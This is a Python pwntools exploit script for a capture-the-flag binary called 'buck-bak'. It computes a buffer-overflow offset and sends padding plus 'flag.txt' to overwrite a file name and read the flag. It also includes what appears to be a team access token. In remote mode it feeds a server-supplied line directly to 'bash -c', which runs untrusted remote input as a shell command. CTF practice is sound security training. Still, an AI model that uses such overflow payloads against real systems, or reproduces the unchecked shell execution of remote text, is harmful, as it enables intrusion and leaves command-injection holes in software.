#!/usr/bin/env python3

import pwn
import pwnlib
import os

pwn.context.terminal = ["tmux", "splitw", "-h"]
pwn.context.binary = elf = pwn.ELF("./buck-bak/buck-bak-server1")

if pwn.args.REMOTE:
    io = pwn.remote("buck-bak.chall.pwnoh.io", 13387)
else:
    io = pwn.process("./buck-bak/buck-bak-server1")

if pwn.args.GDB:
    pwn.gdb.attach(
        io,
        gdbscript="""
break *main+307
continue
"""
    )

offset = pwn.cyclic_find(b"aabqaabraabsaabtaabuaabvaabwaabxaabyaa")
print(f"offset = {offset}")

if pwn.args.REMOTE:
    io.recvuntil("with:\n")
    my_line = io.recvline().strip()
    out = os.popen("bash -c '" + my_line.decode() + "'")
    ans = out.read()
    io.sendlineafter("\n\n", ans.encode())
    io.sendlineafter("run: ", b"better-bodies-cd8eb50e09385e767b53d064353f07e1")

io.sendlineafter("Title", "cool")

payload = b'A' * offset
payload += b"flag.txt"


#payload = pwn.cyclic(256)
io.sendlineafter("Body:\n", payload)
io.interactive()

